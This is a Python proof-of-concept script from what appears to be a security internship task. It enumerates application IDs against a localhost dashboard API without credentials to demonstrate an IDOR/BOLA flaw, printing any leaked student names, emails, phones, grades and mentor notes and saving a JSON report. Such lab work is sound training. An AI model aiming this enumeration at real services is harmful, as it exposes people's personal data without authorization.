#!/usr/bin/env python3
"""
Datheon Application Security & API Pentesting Internship
Task 1: Black-Box Reconnaissance & URL Parameter Fuzzing (IDOR PoC)

Author: Yadish Kumar (Application ID: DT-2026-7ZENR)
Program: Datheon Application Security & API Pentesting
Vulnerability: OWASP API1:2023 - Broken Object Level Authorization (BOLA/IDOR)
CWE: CWE-639 (Authorization Bypass Through User-Controlled Key)
"""

import sys
import json
import urllib.request
import urllib.error
from datetime import datetime

TARGET_BASE_URL = "http://localhost:3000"
VULNERABLE_ENDPOINT = f"{TARGET_BASE_URL}/api/v1/dashboard"

# Target query parameter test vectors
SAMPLE_APP_IDS = [
    "DT-2026-001",
    "DT-2026-002",
    "DT-2026-7ZENR",
    "DT-2026-999"  # Non-existent edge case
]

def print_banner():
    banner = """
================================================================================
  🛡️  DATHEON APPSEC AUDIT: TASK 1 IDOR / BOLA RECONNAISSANCE TOOL
  Author: Yadish Kumar | Student Application ID: DT-2026-7ZENR
  Audit Target: Unauthenticated Query Parameter Fuzzing
================================================================================
"""
    print(banner)

def fuzz_parameter(app_id: str) -> dict:
    url = f"{VULNERABLE_ENDPOINT}?appId={app_id}"
    print(f"[*] Fuzzing Target URL: {url}")
    print(f"[*] Stripping all Session Cookies, Bearer Tokens, and Authorization Headers...")

    req = urllib.request.Request(
        url,
        headers={
            "User-Agent": "Datheon-Security-Scanner/1.0",
            "Accept": "application/json"
        }
    )

    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            status_code = response.getcode()
            body = json.loads(response.read().decode("utf-8"))
            print(f"[!] [VULNERABILITY CONFIRMED] HTTP {status_code} OK returned without credentials!")
            print(f"    Leaked Student: {body.get('studentName')} ({body.get('email')})")
            print(f"    Leaked Phone:   {body.get('phone')}")
            print(f"    Leaked Grade:   {body.get('internalEvaluationGrade')}")
            print(f"    Confidential:   {body.get('confidentialMentorNotes')[:40]}...")
            return {
                "appId": app_id,
                "status": status_code,
                "vulnerable": True,
                "leakedPii": {
                    "name": body.get("studentName"),
                    "email": body.get("email"),
                    "phone": body.get("phone"),
                    "notes": body.get("confidentialMentorNotes")
                }
            }
    except urllib.error.HTTPError as e:
        status_code = e.code
        print(f"[-] HTTP {status_code}: Resource not returned or rejected.")
        return {
            "appId": app_id,
            "status": status_code,
            "vulnerable": False,
            "error": str(e)
        }
    except urllib.error.URLError as e:
        print(f"[X] Connection Error: {e.reason}. Ensure the testbed server is running (npm run dev).")
        return {
            "appId": app_id,
            "status": 0,
            "vulnerable": False,
            "error": str(e.reason)
        }

def main():
    print_banner()
    results = {
        "auditMetadata": {
            "auditor": "Yadish Kumar",
            "applicationId": "DT-2026-7ZENR",
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "vulnerabilityType": "OWASP API1:2023 - Broken Object Level Authorization (BOLA)",
            "cvssScore": 7.5,
            "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
        },
        "findings": []
    }

    for app_id in SAMPLE_APP_IDS:
        print("-" * 70)
        finding = fuzz_parameter(app_id)
        results["findings"].append(finding)

    print("=" * 80)
    print("[+] Audit Complete. Generating PoC Fuzzing Artifact: reports/idor_fuzz_results.json")
    
    try:
        with open("reports/idor_fuzz_results.json", "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)
        print("[+] Artifact saved successfully.")
    except Exception as err:
        print(f"[-] Error writing report: {err}")

if __name__ == "__main__":
    main()
